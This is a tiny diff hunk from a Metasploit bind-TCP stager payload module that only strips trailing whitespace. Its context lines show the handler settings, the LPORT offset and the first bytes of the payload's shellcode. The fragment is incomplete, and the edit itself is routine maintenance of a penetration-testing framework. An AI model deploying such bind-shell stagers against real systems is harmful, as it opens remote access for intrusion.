@@ -25,7 +25,7 @@ module Metasploit3
 			'Handler'	=> Msf::Handler::BindTcp,
 			'Convention'	=> 'sockedi',
 			'Stager'	=>
-			{ 
+			{
 				'Offsets' => { 'LPORT' => [ 27, 'n'] },
 				'Payload' =>
 					"\x31\xc0\x99\x50\x40\x50\x40\x50"+
